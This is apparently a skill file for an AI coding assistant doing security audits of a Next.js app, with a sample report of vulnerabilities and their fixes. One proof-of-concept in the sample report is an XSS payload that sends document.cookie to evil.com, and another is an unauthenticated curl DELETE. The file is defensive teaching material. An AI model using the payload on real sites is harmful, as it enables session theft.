# Security Audit Skill

## Purpose

Identify security vulnerabilities including authentication issues, input validation gaps, XSS, SQL injection risks, and exposed secrets.

## Triggers

- "security audit"
- "check security"
- "security review"
- "find vulnerabilities"
- "security scan"

## Input Requirements

- **scope**: Specific files/features or full codebase
- **focus**: Optional focus (auth, input validation, data exposure)
- **severity**: Report all issues or only above certain severity

## Execution Steps

### 1. Authentication & Authorization Audit

- Check all API routes for auth implementation
- Verify protected routes use Clerk middleware
- Look for missing authentication checks
- Check for trusting client-provided user IDs
- Verify role-based access control
- Check session validation

### 2. Input Validation Check

- Find endpoints accepting user input
- Check for validation of required fields
- Verify type validation
- Look for length constraints
- Check format validation (email, URL)
- Verify file upload validation

### 3. XSS (Cross-Site Scripting) Scan

- Check for `dangerouslySetInnerHTML` usage
- Verify HTML/Markdown sanitization
- Look for unescaped user content
- Check for unsafe `innerHTML` usage
- Verify URL sanitization in links
- Check for `eval()` or `Function()` usage

### 4. SQL Injection Analysis

- Verify parameterized queries (Supabase does this)
- Check for raw SQL concatenation
- Look for dynamic query building
- Verify RPC function parameter handling

### 5. Secret & Credential Exposure

- Scan for hardcoded API keys
- Check environment variable usage
- Verify secrets not in client bundles
- Look for secrets in logs
- Check .gitignore for sensitive files
- Scan for accidentally committed secrets

### 6. Data Access Control

- Verify Row Level Security (RLS) policies
- Check ownership verification in mutations
- Look for unauthorized data access
- Verify proper scoping of queries
- Check for information leakage in errors

### 7. Error Handling Security

- Check error messages don't expose internals
- Verify no stack traces sent to client
- Look for database errors exposed
- Check for proper error logging
- Verify generic error messages

### 8. File Upload Security

- Check file type validation
- Verify file size limits
- Look for filename sanitization
- Check storage permissions
- Verify virus scanning (if applicable)

### 9. Dependency Vulnerabilities

- Check `npm audit` results
- Identify outdated packages
- Look for packages with known CVEs
- Check for unused dependencies

## Output Format

```markdown
# Security Audit Report

## Executive Summary

- **Vulnerabilities Found**: 7
- **Critical**: 2
- **High**: 2
- **Medium**: 2
- **Low**: 1
- **Overall Risk**: HIGH ⚠️

## Critical Vulnerabilities

### 1. Missing Authentication on Delete Endpoint

**Severity**: CRITICAL 🔴  
**CWE**: CWE-306 (Missing Authentication)  
**File**: `app/api/posts/[id]/route.ts`  
**Lines**: 25-30

**Issue**: Delete endpoint has no authentication check - anyone can delete any post

\`\`\`typescript
// ❌ VULNERABLE
export async function DELETE(
request: NextRequest,
{ params }: { params: { id: string } }
) {
await deletePost(params.id); // No auth check!
return new NextResponse(null, { status: 204 });
}
\`\`\`

**Impact**:

- Attacker can delete any blog post
- Data loss
- Service disruption

**Proof of Concept**:
\`\`\`bash
curl -X DELETE https://yoursite.com/api/posts/123

# Successfully deletes post without authentication

\`\`\`

**Fix**:
\`\`\`typescript
// ✅ SECURED
import { auth } from '@clerk/nextjs/server';

export async function DELETE(
request: NextRequest,
{ params }: { params: { id: string } }
) {
const { userId } = await auth();

if (!userId) {
return NextResponse.json(
{ error: 'Authentication required' },
{ status: 401 }
);
}

// Verify ownership
const post = await getPostById(params.id);
if (post.author_id !== userId) {
return NextResponse.json(
{ error: 'Unauthorized' },
{ status: 403 }
);
}

await deletePost(params.id);
return new NextResponse(null, { status: 204 });
}
\`\`\`

**Priority**: IMMEDIATE - Fix within 24 hours

---

### 2. Unsanitized HTML Rendering (XSS)

**Severity**: CRITICAL 🔴  
**CWE**: CWE-79 (Cross-Site Scripting)  
**File**: `components/BlogPost.tsx`  
**Lines**: 45

**Issue**: User-generated markdown rendered without sanitization

\`\`\`typescript
// ❌ VULNERABLE

<div dangerouslySetInnerHTML={{ __html: marked(post.content) }} />
\`\`\`

**Impact**:

- Attacker can inject malicious JavaScript
- Steal user sessions/cookies
- Redirect users to phishing sites
- Deface website

**Proof of Concept**:
\`\`\`markdown
Blog post content:
<img src=x onerror="alert(document.cookie)">

<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>

\`\`\`

**Fix**:
\`\`\`typescript
// ✅ SECURED
import DOMPurify from 'isomorphic-dompurify';
import { marked } from 'marked';

const html = marked(post.content);
const clean = DOMPurify.sanitize(html, {
ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'code', 'pre'],
ALLOWED_ATTR: ['href', 'target', 'rel'],
});

<div dangerouslySetInnerHTML={{ __html: clean }} />
\`\`\`

**Additional**: Install `isomorphic-dompurify` and `@types/dompurify`

**Priority**: IMMEDIATE - Fix within 24 hours

---

## High Severity Vulnerabilities

### 3. No Input Validation on Create Post

**Severity**: HIGH 🟠  
**CWE**: CWE-20 (Improper Input Validation)  
**File**: `app/api/posts/route.ts`  
**Lines**: 10-15

**Issue**: No validation of post data before database insertion

\`\`\`typescript
// ❌ VULNERABLE
export async function POST(request: NextRequest) {
const body = await request.json();
const post = await createPost(body); // No validation!
return NextResponse.json(post);
}
\`\`\`

**Impact**:

- SQL injection via crafted input (mitigated by Supabase)
- DoS via massive content
- Data corruption
- Business logic bypass

**Fix**:
\`\`\`typescript
// ✅ SECURED
export async function POST(request: NextRequest) {
const { userId } = await auth();
if (!userId) {
return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
}

const body = await request.json();

// Validate required fields
if (!body.title || typeof body.title !== 'string') {
return NextResponse.json(
{ error: 'Title is required and must be a string' },
{ status: 400 }
);
}

// Validate length constraints
if (body.title.length < 3 || body.title.length > 200) {
return NextResponse.json(
{ error: 'Title must be between 3 and 200 characters' },
{ status: 400 }
);
}

if (body.content && body.content.length > 100000) {
return NextResponse.json(
{ error: 'Content too large (max 100KB)' },
{ status: 400 }
);
}

// Sanitize input
const sanitized = {
title: body.title.trim(),
content: body.content?.trim(),
author_id: userId, // From auth, not body!
};

const post = await createPost(sanitized);
return NextResponse.json(post);
}
\`\`\`

**Priority**: HIGH - Fix within 3 days

---

### 4. Exposed Internal Errors

**Severity**: HIGH 🟠  
**CWE**: CWE-209 (Information Exposure Through Error Message)  
**File**: `app/api/posts/route.ts`  
**Lines**: 20-25

**Issue**: Database errors exposed to client

\`\`\`typescript
// ❌ VULNERABLE
try {
const post = await createPost(data);
return NextResponse.json(post);
} catch (error) {
return NextResponse.json(
{ error: error.message }, // Exposes internal details!
{ status: 500 }
);
}
\`\`\`

**Impact**:

- Reveals database structure
- Exposes file paths
- Leaks sensitive configuration
- Aids attacker reconnaissance

**Fix**:
\`\`\`typescript
// ✅ SECURED
try {
const post = await createPost(data);
return NextResponse.json(post);
} catch (error) {
// Log full error server-side
console.error('Error creating post:', error);

// Return generic message to client
return NextResponse.json(
{ error: 'Failed to create post' },
{ status: 500 }
);
}
\`\`\`

**Priority**: HIGH - Fix within 1 week

---

## Medium Severity Issues

### 5. No Rate Limiting

**Severity**: MEDIUM 🟡  
**CWE**: CWE-307 (Improper Restriction of Excessive Authentication Attempts)  
**File**: All API routes

**Issue**: No rate limiting on API endpoints

**Impact**:

- Brute force attacks possible
- DoS via excessive requests
- Resource exhaustion
- Increased costs

**Recommendation**:
\`\`\`bash
npm install @upstash/ratelimit @upstash/redis
\`\`\`

\`\`\`typescript
// Add rate limiting middleware
import { Ratelimit } from '@upstash/ratelimit';
import { Redis } from '@upstash/redis';

const ratelimit = new Ratelimit({
redis: Redis.fromEnv(),
limiter: Ratelimit.slidingWindow(10, '10 s'),
});

export async function POST(request: NextRequest) {
const ip = request.ip || 'anonymous';
const { success } = await ratelimit.limit(ip);

if (!success) {
return NextResponse.json(
{ error: 'Too many requests' },
{ status: 429 }
);
}

// Continue...
}
\`\`\`

**Priority**: MEDIUM - Fix within 2 weeks

---

### 6. Missing File Upload Validation

**Severity**: MEDIUM 🟡  
**CWE**: CWE-434 (Unrestricted Upload of File with Dangerous Type)  
**File**: `app/api/upload/route.ts`  
**Lines**: 10-15

**Issue**: No validation of uploaded file types

**Fix**:
\`\`\`typescript
export async function POST(request: NextRequest) {
const formData = await request.formData();
const file = formData.get('file') as File;

// Validate file type
const allowedTypes = ['image/jpeg', 'image/png', 'image/webp'];
if (!allowedTypes.includes(file.type)) {
return NextResponse.json(
{ error: 'Invalid file type' },
{ status: 400 }
);
}

// Validate file size (5MB max)
const maxSize = 5 _ 1024 _ 1024;
if (file.size > maxSize) {
return NextResponse.json(
{ error: 'File too large' },
{ status: 400 }
);
}

// Sanitize filename
const sanitized = file.name.replace(/[^a-zA-Z0-9.-]/g, '\_');

// Upload...
}
\`\`\`

**Priority**: MEDIUM - Fix within 2 weeks

---

## Low Severity Issues

### 7. Missing Security Headers

**Severity**: LOW 🟢  
**File**: `next.config.ts`

**Issue**: Missing security headers

**Fix**:
\`\`\`typescript
const nextConfig = {
async headers() {
return [
{
source: '/:path\*',
headers: [
{ key: 'X-Content-Type-Options', value: 'nosniff' },
{ key: 'X-Frame-Options', value: 'DENY' },
{ key: 'X-XSS-Protection', value: '1; mode=block' },
{ key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
],
},
];
},
};
\`\`\`

**Priority**: LOW - Fix within 1 month

---

## Dependency Vulnerabilities

\`\`\`bash
npm audit
\`\`\`

**Results**:

- 0 critical
- 0 high
- 2 moderate
- 5 low

**Recommendation**: Run `npm audit fix` to update packages

---

## Best Practices Checklist

### Authentication & Authorization

- ⚠️ Some endpoints missing auth
- ✅ Clerk properly configured
- ⚠️ No role-based access control

### Input Validation

- ⚠️ Missing validation on write endpoints
- ❌ No file upload validation
- ❌ No rate limiting

### XSS Prevention

- ❌ Unsanitized HTML rendering
- ✅ React escapes by default
- ⚠️ Some dangerouslySetInnerHTML without sanitization

### Data Access

- ✅ RLS enabled in Supabase
- ✅ Queries use parameterization
- ⚠️ Some endpoints don't verify ownership

### Error Handling

- ⚠️ Some errors expose internal details
- ✅ Errors logged server-side
- ⚠️ Stack traces not always caught

### Secrets Management

- ✅ Using environment variables
- ✅ No hardcoded secrets found
- ✅ .gitignore properly configured

---

## Remediation Plan

### Phase 1 (Immediate - 24-48 hours)

1. Fix missing authentication on delete endpoint
2. Add HTML sanitization with DOMPurify
   **Risk Reduction**: 60%

### Phase 2 (This Week)

3. Add input validation to all write endpoints
4. Fix error message exposure
   **Risk Reduction**: 25%

### Phase 3 (Next 2 Weeks)

5. Implement rate limiting
6. Add file upload validation
   **Risk Reduction**: 10%

### Phase 4 (This Month)

7. Add security headers
8. Update dependencies
   **Risk Reduction**: 5%

---

## Next Steps

1. Create GitHub issues for each vulnerability
2. Implement Phase 1 fixes immediately
3. Run security audit again after fixes
4. Set up automated security scanning (e.g., Snyk)
```

## Constraints

- **No breaking changes** to functionality
- **Test thoroughly** after security fixes
- **Document security decisions**
- **Follow principle of least privilege**

## Validation Checklist

- [ ] All API routes have authentication
- [ ] Input validation on all writes
- [ ] HTML/Markdown sanitized before render
- [ ] No secrets in client bundle
- [ ] Error messages don't expose internals
- [ ] File uploads validated
- [ ] Security headers configured
- [ ] Dependencies up to date

## Example Usage

**User**: "Run a security audit on the API routes"

**Skill Output**: Analyzes all `app/api/` routes, checks authentication, input validation, error handling, finds critical missing auth on delete, unsanitized HTML, exposed errors. Produces detailed report with severity ratings, PoCs, fixes, and phased remediation plan.
